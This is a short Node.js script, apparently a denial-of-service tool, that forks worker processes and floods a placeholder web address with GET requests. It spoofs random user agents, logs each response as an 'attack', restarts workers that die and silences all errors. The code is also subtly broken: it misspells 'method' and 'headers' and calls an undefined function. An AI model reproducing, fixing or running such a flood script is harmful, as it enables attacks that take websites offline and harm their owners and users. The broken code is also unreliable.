const request = require('request')
const fakeUa = require('fake-useragent')
const cluster = require('cluster')

function king() {
  function runx() {
    var sayser = {
      url: 'เว็บ',
      medthod: 'get',
      handers: {
      'Cache-Control': 'no-cache',
      'user-agent': fakeUa()
      }
    }
    request(sayser,function(error,atx) {
      console.log ("attack",atx.statusCode)
    })
  }
  function loop() {
    setInterval(() => {
      runx()
    })
  }
  function thread(){
  if (cluster.isMaster){
    for (let i=0;i<5;i++){
      cluster.fork()
    }
    cluster.on('exit',function(){
      cluster.fork()
    })
    
  }
  else{
    time()
    
  }
    
}
thread()

}
process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});
king()
